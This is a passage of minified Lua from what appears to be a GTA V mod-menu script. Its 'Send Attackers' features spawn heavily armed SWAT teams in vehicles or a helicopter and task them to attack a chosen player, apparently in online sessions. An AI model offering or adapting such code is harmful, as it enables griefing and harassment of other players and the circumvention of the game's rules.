at_range(NooseTeam6[e],1)ped.set_ped_combat_ability(NooseTeam6[e],2)ped.set_ped_combat_movement(NooseTeam6[e],2)ped.set_ped_max_health(NooseTeam6[e],328.0)ped.set_ped_health(NooseTeam6[e],328.0)ped.set_ped_config_flag(NooseTeam6[e],187,0)ped.set_ped_can_ragdoll(NooseTeam6[e],false)for l=1,26 do ped.set_ped_ragdoll_blocking_flags(NooseTeam6[e],l)end;ped.set_ped_into_vehicle(NooseTeam6[e],NooseCar2[k],-1)local e=#NooseTeam6+1;NooseTeam6[e]=ped.create_ped(6,i,d,d.z,true,false)if#NooseTeam6>=8 then end;entity.set_entity_god_mode(NooseTeam6[e],false)streaming.set_model_as_no_longer_needed(i)ped.set_ped_combat_attributes(NooseTeam6[e],46,false)weapon.give_delayed_weapon_to_ped(NooseTeam6[e],0xFDBC8A50,1,1)weapon.give_delayed_weapon_to_ped(NooseTeam6[e],0x2B5EF5EC,1,1)weapon.give_delayed_weapon_to_ped(NooseTeam6[e],0xA3D4D34,1,1)weapon.give_weapon_component_to_ped(NooseTeam6[e],0x2B5EF5EC,0x9307D6FA)weapon.give_weapon_component_to_ped(NooseTeam6[e],0xA3D4D34,0x7BC4CDDC)weapon.give_weapon_component_to_ped(NooseTeam6[e],0xA3D4D34,0xC164F53)weapon.give_weapon_component_to_ped(NooseTeam6[e],0xA3D4D34,0xAA2C45B4)weapon.give_weapon_component_to_ped(NooseTeam6[e],0xA3D4D34,0x334A5203)ped.set_ped_combat_attributes(NooseTeam6[e],1,true)ped.set_ped_combat_attributes(NooseTeam6[e],3,true)ped.set_ped_prop_index(NooseTeam6[e],0,0,0,0)ped.set_ped_combat_attributes(NooseTeam6[e],2,false)ped.set_ped_combat_attributes(NooseTeam6[e],52,false)ped.set_ped_combat_attributes(NooseTeam6[e],4,true)ped.set_ped_combat_range(NooseTeam6[e],1)ped.set_ped_combat_ability(NooseTeam6[e],2)ped.set_ped_combat_movement(NooseTeam6[e],2)ped.set_ped_max_health(NooseTeam6[e],328.0)ped.set_ped_health(NooseTeam6[e],328.0)ped.set_ped_config_flag(NooseTeam6[e],187,0)ped.set_ped_can_ragdoll(NooseTeam6[e],false)for l=1,26 do ped.set_ped_ragdoll_blocking_flags(NooseTeam6[e],l)end;ped.set_ped_into_vehicle(NooseTeam6[e],NooseCar2[k],0)local e=#NooseTeam6+1;NooseTeam6[e]=ped.create_ped(6,i,d,d.z,true,false)if#NooseTeam6>=8 then end;entity.set_entity_god_mode(NooseTeam6[e],false)streaming.set_model_as_no_longer_needed(i)ped.set_ped_combat_attributes(NooseTeam6[e],46,false)weapon.give_delayed_weapon_to_ped(NooseTeam6[e],0xFDBC8A50,1,1)weapon.give_delayed_weapon_to_ped(NooseTeam6[e],0x2B5EF5EC,1,1)weapon.give_delayed_weapon_to_ped(NooseTeam6[e],0xA3D4D34,1,1)weapon.give_weapon_component_to_ped(NooseTeam6[e],0x2B5EF5EC,0x9307D6FA)weapon.give_weapon_component_to_ped(NooseTeam6[e],0xA3D4D34,0x7BC4CDDC)weapon.give_weapon_component_to_ped(NooseTeam6[e],0xA3D4D34,0xC164F53)weapon.give_weapon_component_to_ped(NooseTeam6[e],0xA3D4D34,0xAA2C45B4)weapon.give_weapon_component_to_ped(NooseTeam6[e],0xA3D4D34,0x334A5203)ped.set_ped_combat_attributes(NooseTeam6[e],1,true)ped.set_ped_combat_attributes(NooseTeam6[e],3,true)ped.set_ped_prop_index(NooseTeam6[e],0,0,0,0)ped.set_ped_combat_attributes(NooseTeam6[e],2,false)ped.set_ped_combat_attributes(NooseTeam6[e],52,false)ped.set_ped_combat_attributes(NooseTeam6[e],4,true)ped.set_ped_combat_range(NooseTeam6[e],1)ped.set_ped_combat_ability(NooseTeam6[e],2)ped.set_ped_combat_movement(NooseTeam6[e],2)ped.set_ped_max_health(NooseTeam6[e],328.0)ped.set_ped_health(NooseTeam6[e],328.0)ped.set_ped_config_flag(NooseTeam6[e],187,0)ped.set_ped_can_ragdoll(NooseTeam6[e],false)for l=1,26 do ped.set_ped_ragdoll_blocking_flags(NooseTeam6[e],l)end;ped.set_ped_into_vehicle(NooseTeam6[e],NooseCar2[k],1)local e=#NooseTeam6+1;NooseTeam6[e]=ped.create_ped(6,i,d,d.z,true,false)if#NooseTeam6>=8 then end;entity.set_entity_god_mode(NooseTeam6[e],false)streaming.set_model_as_no_longer_needed(i)ped.set_ped_combat_attributes(NooseTeam6[e],46,false)weapon.give_delayed_weapon_to_ped(NooseTeam6[e],0xFDBC8A50,1,1)weapon.give_delayed_weapon_to_ped(NooseTeam6[e],0x2B5EF5EC,1,1)weapon.give_delayed_weapon_to_ped(NooseTeam6[e],0xA3D4D34,1,1)weapon.give_weapon_component_to_ped(NooseTeam6[e],0x2B5EF5EC,0x9307D6FA)weapon.give_weapon_component_to_ped(NooseTeam6[e],0xA3D4D34,0x7BC4CDDC)weapon.give_weapon_component_to_ped(NooseTeam6[e],0xA3D4D34,0xC164F53)weapon.give_weapon_component_to_ped(NooseTeam6[e],0xA3D4D34,0xAA2C45B4)weapon.give_weapon_component_to_ped(NooseTeam6[e],0xA3D4D34,0x334A5203)ped.set_ped_combat_attributes(NooseTeam6[e],1,true)ped.set_ped_combat_attributes(NooseTeam6[e],3,true)ped.set_ped_prop_index(NooseTeam6[e],0,0,0,0)ped.set_ped_combat_attributes(NooseTeam6[e],2,false)ped.set_ped_combat_attributes(NooseTeam6[e],52,false)ped.set_ped_combat_attributes(NooseTeam6[e],4,true)ped.set_ped_combat_range(NooseTeam6[e],1)ped.set_ped_combat_ability(NooseTeam6[e],2)ped.set_ped_combat_movement(NooseTeam6[e],2)ped.set_ped_max_health(NooseTeam6[e],328.0)ped.set_ped_health(NooseTeam6[e],328.0)ped.set_ped_config_flag(NooseTeam6[e],187,0)ped.set_ped_can_ragdoll(NooseTeam6[e],false)for l=1,26 do ped.set_ped_ragdoll_blocking_flags(NooseTeam6[e],l)end;ped.set_ped_into_vehicle(NooseTeam6[e],NooseCar2[k],2)while g.on do ai.task_combat_ped(NooseTeam6[e],h,0,16)system.wait(25)if entity.is_entity_dead(NooseTeam6[e])then return HANDLER_CONTINUE end;for e=1,#NooseTeam6 do system.wait(25)ai.task_combat_ped(NooseTeam6[e],h,0,16)if utilities.get_distance_between(h,NooseTeam6[e])>1000 then network.request_control_of_entity(NooseTeam6[e])entity.set_entity_as_no_longer_needed(NooseTeam6[e])network.request_control_of_entity(NooseCar2[k])entity.set_entity_as_no_longer_needed(NooseCar2[k])end end end;while g.off do return HANDLER_POP end;local d=v3()d.x=-5784.258301;d.y=-8289.385742;d.z=-136.411270;for e=1,#NooseTeam6 do ped.get_all_peds(NooseTeam6[e])system.wait(25)network.request_control_of_entity(NooseTeam6[e])entity.set_entity_coords_no_offset(NooseTeam6[e],d)entity.set_entity_as_no_longer_needed(NooseTeam6[e])entity.delete_entity(NooseTeam6[e])end;for k=1,#NooseCar2 do vehicle.get_all_vehicles(NooseCar2[k])system.wait(25)network.request_control_of_entity(NooseCar2[k])entity.set_entity_coords_no_offset(NooseCar2[k],d)entity.set_entity_as_no_longer_needed(NooseCar2[k])entity.delete_entity(NooseCar2[k])end end)playerfeature["Send Noose Riot Control Team"]=menu.add_player_feature("Send Noose Riot Control Team","toggle",playerparents["Send Attackers"].id,function(g,b)local d=v3()local h=player.get_player_ped(b)d=player.get_player_coords(b)d.x=d.x+100;d.y=d.y+0;d.z=d.z-0;system.wait(100)local i=gameplay.get_hash_key("s_m_y_swat_01")streaming.request_model(i)while not streaming.has_model_loaded(i)do system.wait(10)end;local e=#NooseTeam5+1;NooseTeam5[e]=ped.create_ped(6,i,d,d.z,true,false)if#NooseTeam5>=8 then end;entity.set_entity_god_mode(NooseTeam5[e],false)streaming.set_model_as_no_longer_needed(i)local j=0x9B16A3B4;streaming.request_model(j)while not streaming.has_model_loaded(j)do system.wait(10)end;local k=#NooseRCV+1;NooseRCV[k]=vehicle.create_vehicle(j,d,d.z,true,false)entity.set_entity_god_mode(NooseRCV[k],false)vehicle.set_vehicle_mod_kit_type(NooseRCV[k],0)vehicle.get_vehicle_mod(NooseRCV[k],10)vehicle.set_vehicle_mod(NooseRCV[k],10,0,false)ped.set_ped_combat_attributes(NooseTeam5[e],46,false)weapon.give_delayed_weapon_to_ped(NooseTeam5[e],0xFDBC8A50,1,1)weapon.give_delayed_weapon_to_ped(NooseTeam5[e],0xBFE256D4,1,1)weapon.give_delayed_weapon_to_ped(NooseTeam5[e],0x969C3D67,1,1)weapon.give_weapon_component_to_ped(NooseTeam5[e],0xBFE256D4,0x85FEA109)weapon.give_weapon_component_to_ped(NooseTeam5[e],0xBFE256D4,0x21E34793)weapon.give_weapon_component_to_ped(NooseTeam5[e],0xBFE256D4,0x43FD595B)weapon.give_weapon_component_to_ped(NooseTeam5[e],0x969C3D67,0xC66B6542)weapon.give_weapon_component_to_ped(NooseTeam5[e],0x969C3D67,0xF97F783B)weapon.give_weapon_component_to_ped(NooseTeam5[e],0x969C3D67,0x9D65907A)weapon.give_weapon_component_to_ped(NooseTeam5[e],0x969C3D67,0x347EF8AC)weapon.give_weapon_component_to_ped(NooseTeam5[e],0x969C3D67,0x7BC4CDDC)ped.set_ped_combat_attributes(NooseTeam5[e],1,true)ped.set_ped_combat_attributes(NooseTeam5[e],3,true)ped.set_ped_prop_index(NooseTeam5[e],0,0,0,0)ped.set_ped_combat_attributes(NooseTeam5[e],2,true)ped.set_ped_combat_attributes(NooseTeam5[e],52,false)ped.set_ped_combat_attributes(NooseTeam5[e],4,true)ped.set_ped_combat_range(NooseTeam5[e],1)ped.set_ped_combat_ability(NooseTeam5[e],2)ped.set_ped_combat_movement(NooseTeam5[e],2)ped.set_ped_max_health(NooseTeam5[e],328.0)ped.set_ped_health(NooseTeam5[e],328.0)ped.set_ped_config_flag(NooseTeam5[e],187,0)ped.set_ped_can_ragdoll(NooseTeam5[e],false)for l=1,26 do ped.set_ped_ragdoll_blocking_flags(NooseTeam5[e],l)end;ped.set_ped_into_vehicle(NooseTeam5[e],NooseRCV[k],-1)local e=#NooseTeam5+1;NooseTeam5[e]=ped.create_ped(6,i,d,d.z,true,false)if#NooseTeam5>=8 then end;entity.set_entity_god_mode(NooseTeam5[e],false)streaming.set_model_as_no_longer_needed(i)ped.set_ped_combat_attributes(NooseTeam5[e],46,false)weapon.give_delayed_weapon_to_ped(NooseTeam5[e],0xFDBC8A50,1,1)weapon.give_delayed_weapon_to_ped(NooseTeam5[e],0xBFE256D4,1,1)weapon.give_delayed_weapon_to_ped(NooseTeam5[e],0x78A97CD0,1,1)weapon.give_weapon_component_to_ped(NooseTeam5[e],0xBFE256D4,0x85FEA109)weapon.give_weapon_component_to_ped(NooseTeam5[e],0xBFE256D4,0x21E34793)weapon.give_weapon_component_to_ped(NooseTeam5[e],0xBFE256D4,0x43FD595B)weapon.give_weapon_component_to_ped(NooseTeam5[e],0x78A97CD0,0x3A1BD6FA)weapon.give_weapon_component_to_ped(NooseTeam5[e],0x78A97CD0,0x7BC4CDDC)weapon.give_weapon_component_to_ped(NooseTeam5[e],0x78A97CD0,0x3DECC7DA)weapon.give_weapon_component_to_ped(NooseTeam5[e],0x78A97CD0,0xC867A07B)weapon.give_weapon_component_to_ped(NooseTeam5[e],0x78A97CD0,0xA564D78B)ped.set_ped_combat_attributes(NooseTeam5[e],1,true)ped.set_ped_combat_attributes(NooseTeam5[e],3,true)ped.set_ped_prop_index(NooseTeam5[e],0,0,0,0)ped.set_ped_combat_attributes(NooseTeam5[e],2,true)ped.set_ped_combat_attributes(NooseTeam5[e],52,false)ped.set_ped_combat_attributes(NooseTeam5[e],4,true)ped.set_ped_combat_range(NooseTeam5[e],1)ped.set_ped_combat_ability(NooseTeam5[e],2)ped.set_ped_combat_movement(NooseTeam5[e],2)ped.set_ped_max_health(NooseTeam5[e],328.0)ped.set_ped_health(NooseTeam5[e],328.0)ped.set_ped_config_flag(NooseTeam5[e],187,0)ped.set_ped_can_ragdoll(NooseTeam5[e],false)for l=1,26 do ped.set_ped_ragdoll_blocking_flags(NooseTeam5[e],l)end;ped.set_ped_into_vehicle(NooseTeam5[e],NooseRCV[k],0)local e=#NooseTeam5+1;NooseTeam5[e]=ped.create_ped(6,i,d,d.z,true,false)if#NooseTeam5>=8 then end;entity.set_entity_god_mode(NooseTeam5[e],false)streaming.set_model_as_no_longer_needed(i)ped.set_ped_combat_attributes(NooseTeam5[e],46,false)weapon.give_delayed_weapon_to_ped(NooseTeam5[e],0xFDBC8A50,1,1)weapon.give_delayed_weapon_to_ped(NooseTeam5[e],0xBFE256D4,1,1)weapon.give_delayed_weapon_to_ped(NooseTeam5[e],0x78A97CD0,1,1)weapon.give_weapon_component_to_ped(NooseTeam5[e],0xBFE256D4,0x85FEA109)weapon.give_weapon_component_to_ped(NooseTeam5[e],0xBFE256D4,0x21E34793)weapon.give_weapon_component_to_ped(NooseTeam5[e],0xBFE256D4,0x43FD595B)weapon.give_weapon_component_to_ped(NooseTeam5[e],0x78A97CD0,0x3A1BD6FA)weapon.give_weapon_component_to_ped(NooseTeam5[e],0x78A97CD0,0x7BC4CDDC)weapon.give_weapon_component_to_ped(NooseTeam5[e],0x78A97CD0,0x9FDB5652)weapon.give_weapon_component_to_ped(NooseTeam5[e],0x78A97CD0,0xC867A07B)weapon.give_weapon_component_to_ped(NooseTeam5[e],0x78A97CD0,0xA564D78B)ped.set_ped_combat_attributes(NooseTeam5[e],1,true)ped.set_ped_combat_attributes(NooseTeam5[e],3,true)ped.set_ped_prop_index(NooseTeam5[e],0,0,0,0)ped.set_ped_combat_attributes(NooseTeam5[e],2,false)ped.set_ped_combat_attributes(NooseTeam5[e],52,false)ped.set_ped_combat_attributes(NooseTeam5[e],4,true)ped.set_ped_combat_range(NooseTeam5[e],1)ped.set_ped_combat_ability(NooseTeam5[e],2)ped.set_ped_combat_movement(NooseTeam5[e],2)ped.set_ped_max_health(NooseTeam5[e],328.0)ped.set_ped_health(NooseTeam5[e],328.0)ped.set_ped_config_flag(NooseTeam5[e],187,0)ped.set_ped_can_ragdoll(NooseTeam5[e],false)for l=1,26 do ped.set_ped_ragdoll_blocking_flags(NooseTeam5[e],l)end;ped.set_ped_into_vehicle(NooseTeam5[e],NooseRCV[k],1)local e=#NooseTeam5+1;NooseTeam5[e]=ped.create_ped(6,i,d,d.z,true,false)if#NooseTeam5>=8 then end;entity.set_entity_god_mode(NooseTeam5[e],false)streaming.set_model_as_no_longer_needed(i)ped.set_ped_combat_attributes(NooseTeam5[e],46,false)weapon.give_delayed_weapon_to_ped(NooseTeam5[e],0xFDBC8A50,1,1)weapon.give_delayed_weapon_to_ped(NooseTeam5[e],0xBFE256D4,1,1)weapon.give_delayed_weapon_to_ped(NooseTeam5[e],0x78A97CD0,1,1)weapon.give_weapon_component_to_ped(NooseTeam5[e],0xBFE256D4,0x85FEA109)weapon.give_weapon_component_to_ped(NooseTeam5[e],0xBFE256D4,0x21E34793)weapon.give_weapon_component_to_ped(NooseTeam5[e],0xBFE256D4,0x43FD595B)weapon.give_weapon_component_to_ped(NooseTeam5[e],0x78A97CD0,0x3A1BD6FA)weapon.give_weapon_component_to_ped(NooseTeam5[e],0x78A97CD0,0x7BC4CDDC)weapon.give_weapon_component_to_ped(NooseTeam5[e],0x78A97CD0,0xE502AB6B)weapon.give_weapon_component_to_ped(NooseTeam5[e],0x78A97CD0,0xC867A07B)weapon.give_weapon_component_to_ped(NooseTeam5[e],0x78A97CD0,0xA564D78B)ped.set_ped_combat_attributes(NooseTeam5[e],1,true)ped.set_ped_combat_attributes(NooseTeam5[e],3,true)ped.set_ped_prop_index(NooseTeam5[e],0,0,0,0)ped.set_ped_combat_attributes(NooseTeam5[e],2,false)ped.set_ped_combat_attributes(NooseTeam5[e],52,false)ped.set_ped_combat_attributes(NooseTeam5[e],4,true)ped.set_ped_combat_range(NooseTeam5[e],1)ped.set_ped_combat_ability(NooseTeam5[e],2)ped.set_ped_combat_movement(NooseTeam5[e],2)ped.set_ped_max_health(NooseTeam5[e],328.0)ped.set_ped_health(NooseTeam5[e],328.0)ped.set_ped_config_flag(NooseTeam5[e],187,0)ped.set_ped_can_ragdoll(NooseTeam5[e],false)for l=1,26 do ped.set_ped_ragdoll_blocking_flags(NooseTeam5[e],l)end;ped.set_ped_into_vehicle(NooseTeam5[e],NooseRCV[k],2)local e=#NooseTeam5+1;NooseTeam5[e]=ped.create_ped(6,i,d,d.z,true,false)if#NooseTeam5>=8 then end;entity.set_entity_god_mode(NooseTeam5[e],false)streaming.set_model_as_no_longer_needed(i)ped.set_ped_combat_attributes(NooseTeam5[e],46,false)weapon.give_delayed_weapon_to_ped(NooseTeam5[e],0xFDBC8A50,1,1)weapon.give_delayed_weapon_to_ped(NooseTeam5[e],0xBFE256D4,1,1)weapon.give_delayed_weapon_to_ped(NooseTeam5[e],0x555AF99A,1,1)weapon.give_weapon_component_to_ped(NooseTeam5[e],0xBFE256D4,0x21E34793)weapon.give_weapon_component_to_ped(NooseTeam5[e],0xBFE256D4,0x43FD595B)weapon.give_weapon_component_to_ped(NooseTeam5[e],0xBFE256D4,0x85FEA109)weapon.give_weapon_component_to_ped(NooseTeam5[e],0x555AF99A,0xE9582927)weapon.give_weapon_component_to_ped(NooseTeam5[e],0x555AF99A,0x7BC4CDDC)weapon.give_weapon_component_to_ped(NooseTeam5[e],0x555AF99A,0x420FD713)weapon.give_weapon_component_to_ped(NooseTeam5[e],0x555AF99A,0x5F7DCE4D)ped.set_ped_combat_attributes(NooseTeam5[e],1,true)ped.set_ped_combat_attributes(NooseTeam5[e],3,true)ped.set_ped_prop_index(NooseTeam5[e],0,0,0,0)ped.set_ped_combat_attributes(NooseTeam5[e],2,true)ped.set_ped_combat_attributes(NooseTeam5[e],52,false)ped.set_ped_combat_attributes(NooseTeam5[e],4,true)ped.set_ped_combat_range(NooseTeam5[e],1)ped.set_ped_combat_ability(NooseTeam5[e],2)ped.set_ped_combat_movement(NooseTeam5[e],2)ped.set_ped_max_health(NooseTeam5[e],328.0)ped.set_ped_health(NooseTeam5[e],328.0)ped.set_ped_config_flag(NooseTeam5[e],187,0)ped.set_ped_can_ragdoll(NooseTeam5[e],false)for l=1,26 do ped.set_ped_ragdoll_blocking_flags(NooseTeam5[e],l)end;ped.set_ped_into_vehicle(NooseTeam5[e],NooseRCV[k],3)local e=#NooseTeam5+1;NooseTeam5[e]=ped.create_ped(6,i,d,d.z,true,false)if#NooseTeam5>=8 then end;entity.set_entity_god_mode(NooseTeam5[e],false)streaming.set_model_as_no_longer_needed(i)ped.set_ped_combat_attributes(NooseTeam5[e],46,false)weapon.give_delayed_weapon_to_ped(NooseTeam5[e],0xFDBC8A50,1,1)weapon.give_delayed_weapon_to_ped(NooseTeam5[e],0xBFE256D4,1,1)weapon.give_delayed_weapon_to_ped(NooseTeam5[e],0x555AF99A,1,1)weapon.give_weapon_component_to_ped(NooseTeam5[e],0xBFE256D4,0x21E34793)weapon.give_weapon_component_to_ped(NooseTeam5[e],0xBFE256D4,0x43FD595B)weapon.give_weapon_component_to_ped(NooseTeam5[e],0xBFE256D4,0x85FEA109)weapon.give_weapon_component_to_ped(NooseTeam5[e],0x555AF99A,0xE9582927)weapon.give_weapon_component_to_ped(NooseTeam5[e],0x555AF99A,0x7BC4CDDC)weapon.give_weapon_component_to_ped(NooseTeam5[e],0x555AF99A,0x420FD713)weapon.give_weapon_component_to_ped(NooseTeam5[e],0x555AF99A,0x5F7DCE4D)ped.set_ped_combat_attributes(NooseTeam5[e],1,true)ped.set_ped_combat_attributes(NooseTeam5[e],3,true)ped.set_ped_prop_index(NooseTeam5[e],0,0,0,0)ped.set_ped_combat_attributes(NooseTeam5[e],2,true)ped.set_ped_combat_attributes(NooseTeam5[e],52,false)ped.set_ped_combat_attributes(NooseTeam5[e],4,true)ped.set_ped_combat_range(NooseTeam5[e],1)ped.set_ped_combat_ability(NooseTeam5[e],2)ped.set_ped_combat_movement(NooseTeam5[e],2)ped.set_ped_max_health(NooseTeam5[e],328.0)ped.set_ped_health(NooseTeam5[e],328.0)ped.set_ped_config_flag(NooseTeam5[e],187,0)ped.set_ped_can_ragdoll(NooseTeam5[e],false)for l=1,26 do ped.set_ped_ragdoll_blocking_flags(NooseTeam5[e],l)end;ped.set_ped_into_vehicle(NooseTeam5[e],NooseRCV[k],4)while g.on do ai.task_combat_ped(NooseTeam5[e],h,0,16)system.wait(25)if entity.is_entity_dead(NooseTeam5[e])then return HANDLER_CONTINUE end;system.wait(25)for e=1,#NooseTeam5 do system.wait(25)ai.task_combat_ped(NooseTeam5[e],h,0,16)if utilities.get_distance_between(h,NooseTeam5[e])>2000 then network.request_control_of_entity(NooseTeam5[e])entity.set_entity_as_no_longer_needed(NooseTeam5[e])network.request_control_of_entity(NooseRCV[k])entity.set_entity_as_no_longer_needed(NooseRCV[k])end end end;while g.off do return HANDLER_POP end;local d=v3()d.x=-5784.258301;d.y=-8289.385742;d.z=-136.411270;for e=1,#NooseTeam5 do ped.get_all_peds(NooseTeam5[e])system.wait(25)network.request_control_of_entity(NooseTeam5[e])entity.set_entity_coords_no_offset(NooseTeam5[e],d)entity.set_entity_as_no_longer_needed(NooseTeam5[e])entity.delete_entity(NooseTeam5[e])end;for k=1,#NooseRCV do vehicle.get_all_vehicles(NooseRCV[k])system.wait(25)network.request_control_of_entity(NooseRCV[k])entity.set_entity_coords_no_offset(NooseRCV[k],d)entity.set_entity_as_no_longer_needed(NooseRCV[k])entity.delete_entity(NooseRCV[k])end end)playerfeature["Send Annihilator"]=menu.add_player_feature("Send Annihilator","toggle",playerparents["Send Attackers"].id,function(g,b)local d=v3()local h=player.get_player_ped(b)d=player.get_player_coords(b)d.x=d.x+400;d.y=d.y+0;d.z=d.z+150;system.wait(100)local i=gameplay.get_hash_key("s_m_y_swat_01")streaming.request_model(i)while not streaming.has_model_loaded(i)do system.wait(10)end;local e=#NooseTeam4+1;NooseTeam4[e]=ped.create_ped(6,i,d,d.z,true,false)if#NooseTeam4>=8 then end;entity.set_entity_god_mode(NooseTeam4[e],false)streaming.set_model_as_no_longer_needed(i)local j=0x31F0B376;streaming.request_model(j)while not streaming.has_model_loaded(j)do system.wait(10)end;local k=#NooseHelo+1;NooseHelo[k]=vehicle.create_vehicle(j,d,d.z,true,false)entity.set_entity_god_mode(NooseHelo[k],false)ped.set_ped_combat_attributes(NooseTeam4[e],46,false)weapon.give_delayed_weapon_to_ped(NooseTeam4[e],0xBFE256D4,1,1)weapon.give_delayed_weapon_to_ped(NooseTeam4[e],0x2BE6766B,1,1)ped.set_ped_combat_attributes(NooseTeam4[e],1,true)ped.set_ped_combat_attributes(NooseTeam4[e],3,true)ped.set_ped_prop_index(NooseTeam4[e],0,0,0,0)ped.set_ped_combat_attributes(NooseTeam4[e],2,true)ped.set_ped_combat_attributes(NooseTeam4[e],52,true)ped.set_ped_combat_attributes(NooseTeam4[e],4,true)ped.set_ped_combat_range(NooseTeam4[e],2)ped.set_ped_combat_ability(NooseTeam4[e],2)ped.set_ped_combat_movement(NooseTeam4[e],1)ped.set_ped_max_health(NooseTeam4[e],328.0)ped.set_ped_health(NooseTeam4[e],328.0)ped.set_ped_config_flag(NooseTeam4[e],187,0)ped.set_ped_can_ragdoll(NooseTeam4[e],false)for l=1,26 do ped.set_ped_ragdoll_blocking_flags(NooseTeam4[e],l)end;ped.set_ped_into_vehicle(NooseTeam4[e],NooseHelo[k],-1)local e=#NooseTeam4+1;NooseTeam4[e]=ped.create_ped(6,i,d,d.z,true,false)if#NooseTeam4>=8 then end;entity.set_entity_god_mode(NooseTeam4[e],false)streaming.set_model_as_no_longer_needed(i)ped.set_ped_combat_attributes(NooseTeam4[e],46,true)weapon.give_delayed_weapon_to_ped(NooseTeam4[e],0x2B5EF5EC,1,1)weapon.give_delayed_weapon_to_ped(NooseTeam4[e],0x83BF0278,1,1)weapon.give_weapon_component_to_ped(NooseTeam4[e],0x83BF0278,0xBA62E935)weapon.give_weapon_component_to_ped(NooseTeam4[e],0x83BF0278,0x7BC4CDDC)weapon.give_weapon_component_to_ped(NooseTeam4[e],0x83BF0278,0xA0D89C42)weapon.give_weapon_component_to_ped(NooseTeam4[e],0x83BF0278,0xC164F53)ped.set_ped_combat_attributes(NooseTeam4[e],1,true)ped.set_ped_combat_attributes(NooseTeam4[e],3,true)ped.set_ped_prop_index(NooseTeam4[e],0,0,0,0)ped.set_ped_combat_attributes(NooseTeam4[e],2,true)ped.set_ped_combat_attributes(NooseTeam4[e],52,false)ped.set_ped_combat_attributes(NooseTeam4[e],4,true)ped.set_ped_combat_range(NooseTeam4[e],2)ped.set_ped_combat_ability(NooseTeam4[e],2)ped.set_ped_combat_movement(NooseTeam4[e],1)ped.set_ped_max_health(NooseTeam4[e],328.0)ped.set_ped_health(NooseTeam4[e],328.0)ped.set_ped_config_flag(NooseTeam4[e],187,0)ped.set_ped_can_ragdoll(NooseTeam4[e],false)for l=1,26 do ped.set_ped_ragdoll_blocking_flags(NooseTeam4[e],l)end;ped.set_ped_into_vehicle(NooseTeam4[e],NooseHelo[k],1)local e=#NooseTeam4+1;NooseTeam4[e]=ped.create_ped(6,i,d,d.z,true,false)if#NooseTeam4>=8 then end;entity.set_entity_god_mode(NooseTeam4[e],false)streaming.set_model_as_no_longer_needed(i)ped.set_ped_combat_attributes(NooseTeam4[e],46,true)weapon.give_delayed_weapon_to_ped(NooseTeam4[e],0x2B5EF5EC,1,1)weapon.give_delayed_weapon_to_ped(NooseTeam4[e],0x83BF0278,1,1)weapon.give_weapon_component_to_ped(NooseTeam4[e],0x83BF0278,0xBA62E935)weapon.give_weapon_component_to_ped(NooseTeam4[e],0x83BF0278,0x7BC4CDDC)weapon.give_weapon_component_to_ped(NooseTeam4[e],0x83BF0278,0xA0D89C42)weapon.give_weapon_component_to_ped(NooseTeam4[e],0x83BF0278,0xC164F53)ped.set_ped_combat_attributes(NooseTeam4[e],1,true)ped.set_ped_combat_attributes(NooseTeam4[e],3,true)ped.set_ped_prop_index(NooseTeam4[e],0,0,0,0)ped.set_ped_combat_attributes(NooseTeam4[e],2,true)ped.set_ped_combat_attributes(NooseTeam4[e],52,false)ped.set_ped_combat_attributes(NooseTeam4[e],4,true)ped.set_ped_combat_range(NooseTeam4[e],2)ped.set_ped_combat_ability(NooseTeam4[e],2)ped.set_ped_combat_movement(NooseTeam4[e],1)ped.set_ped_max_health(NooseTeam4[e],328.0)ped.set_ped_health(NooseTeam4[e],328.0)ped.set_ped_can_ragdoll(NooseTeam4[e],false)ped.set_ped_into_vehicle(NooseTeam4[e],NooseHelo[k],2)local e=#NooseTeam4+1;NooseTeam4[e]=ped.create_ped(6,i,d,d.z,true,false)if#NooseTeam4>=8 then end;entity.set_entity_god_mode(NooseTeam4[e],false)streaming.set_model_as_no_longer_needed(i)ped.set_ped_combat_attributes(NooseTeam4[e],46,true)weapon.give_delayed_weapon_to_ped(NooseTeam4[e],0x2B5EF5EC,1,1)weapon.give_delayed_weapon_to_ped(NooseTeam4[e],0xC0A3098D,1,1)weapon.give_weapon_component_to_ped(NooseTeam4[e],0xC0A3098D,0x6B59AEAA)weapon.give_weapon_component_to_ped(NooseTeam4[e],0xC0A3098D,0x7BC4CDDC)weapon.give_weapon_component_to_ped(NooseTeam4[e],0xC0A3098D,0xA0D89C42)weapon.give_weapon_component_to_ped(NooseTeam4[e],0xC0A3098D,0xC164F53)ped.set_ped_combat_attributes(NooseTeam4[e],1,true)ped.set_ped_combat_attributes(NooseTeam4[e],3,true)ped.set_ped_prop_index(NooseTeam4[e],0,0,0,0)ped.set_ped_combat_attributes(NooseTeam4[e],2,true)ped.set_ped_combat_attributes(NooseTeam4[e],52,false)ped.set_ped_combat_attributes(NooseTeam4[e],4,true)ped.set_ped_combat_range(NooseTeam4[e],2)ped.set_ped_combat_ability(NooseTeam4[e],2)ped.set_ped_combat_movement(NooseTeam4[e],1)ped.set_ped_max_health(NooseTeam4[e],328.0)ped.set_ped_health(NooseTeam4[e],328.0)ped.set_ped_config_flag(NooseTeam4[e],187,0)ped.set_ped_can_ragdoll(NooseTeam4[e],false)for l=1,26 do ped.set_ped_ragdoll_blocking_flags(NooseTeam4[e],l)end;ped.set_ped_into_vehicle(NooseTeam4[e],NooseHelo[k],3)local e=#NooseTeam4+1;NooseTeam4[e]=ped.create_ped(6,i,d,d.z,true,false)if#NooseTeam4>=8 then end;entity.set_entity_god_mode(NooseTeam4[e],false)streaming.set_model_as_no_longer_needed(i)ped.set_ped_combat_attributes(NooseTeam4[e],46,true)weapon.give_delayed_weapon_to_ped(NooseTeam4[e],0x2B5EF5EC,1,1)weapon.give_delayed_weapon_to_ped(NooseTeam4[e],0xC0A3098D,1,1)weapon.give_weapon_component_to_ped(NooseTeam4[e],0xC0A3098D,0x6B59AEAA)weapon.give_weapon_component_to_ped(NooseTeam4[e],0xC0A3098D,0x7BC4CDDC)weapon.give_weapon_component_to_ped(NooseTeam4[e],0xC0A3098D,0xA0D89C42)weapon.give_weapon_component_to_ped(NooseTeam4[e],0xC0A3098D,0xC164F53)ped.set_ped_combat_attributes(NooseTeam4[e],1,true)ped.set_ped_combat_attributes(NooseTeam4[e],3,true)ped.set_ped_prop_index(NooseTeam4[e],0,0,0,0)ped.set_ped_combat_attributes(NooseTeam4[e],2,true)ped.set_ped_combat_attributes(NooseTeam4[e],52,false)ped.set_ped_combat_attributes(NooseTeam4[e],4,true)ped.set_ped_combat_range(NooseTeam4[e],2)ped.set_ped_combat_ability(NooseTeam4[e],2)ped.set_ped_combat_movement(NooseTeam4[e],1)ped.set_ped_max_health(NooseTeam4[e],328.0)ped.set_ped_health(NooseTeam4[e],328.0)ped.set_ped_config_flag(